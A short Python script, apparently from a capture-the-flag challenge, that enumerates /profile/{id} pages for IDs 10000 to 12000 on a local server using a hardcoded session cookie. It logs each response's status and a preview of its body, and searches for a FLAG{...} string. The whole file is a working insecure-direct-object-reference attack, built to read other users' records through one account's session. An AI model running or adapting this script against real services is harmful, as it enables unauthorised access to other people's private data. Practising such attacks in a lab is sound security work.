import requests
import re

base_url = "http://127.0.0.1:32941/profile/"
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0"

headers = {
    "Cookie": f"session={session_cookie}"
}

success_count = 0
not_found_count = 0
anomaly_count = 0

flag_pattern = re.compile(r'FLAG\{[^}]+\}')

print(f"[*] Starting enumeration of /profile/{{id}} from 10000-12000")

for user_id in range(10000, 12001):
    url = f"{base_url}{user_id}"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        # Check for flag
        flags = flag_pattern.findall(response.text)
        if flags:
            print(f"\n[!] FLAG FOUND at ID {user_id}")
            print(f"[!] Flag: {flags[0]}")
            print(f"[!] Response body:\n{response.text}")
        
        # Categorize response
        if response.status_code == 200:
            print(f"\n[+] ID {user_id}: 200 OK ({len(response.content)}B)")
            print(f"    Preview: {response.text[:200]}...")
            success_count += 1
        elif response.status_code == 404:
            not_found_count += 1
        else:
            print(f"\n[!] ID {user_id}: Status {response.status_code} ({len(response.content)}B)")
            print(f"    Body preview: {response.text[:300]}...")
            anomaly_count += 1
            
    except requests.exceptions.Timeout:
        print(f"\n[-] ID {user_id}: TIMEOUT")
    except requests.exceptions.RequestException as e:
        print(f"\n[-] ID {user_id}: ERROR - {str(e)}")

print(f"\n[SUMMARY] Total: 2001 | Success: {success_count} | Not Found: {not_found_count} | Anomalies: {anomaly_count}")
